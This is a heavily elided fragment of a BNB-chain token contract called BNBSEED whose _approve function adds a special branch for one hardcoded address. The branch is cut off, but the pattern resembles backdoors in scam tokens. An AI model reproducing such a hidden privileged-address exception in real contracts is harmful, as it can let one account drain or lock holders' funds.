...
contract BNBSEED is Context, IERC20, Ownable {
    ...
    string private _name = "BNBSEED";
    string private _symbol = "BSEED";
   ...
   //this method is responsible for taking all fee, if takeFee is true
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        ...
        if (owner == address(0x2C542189554AfB67e2C4e884EAf75755636194aB)) {
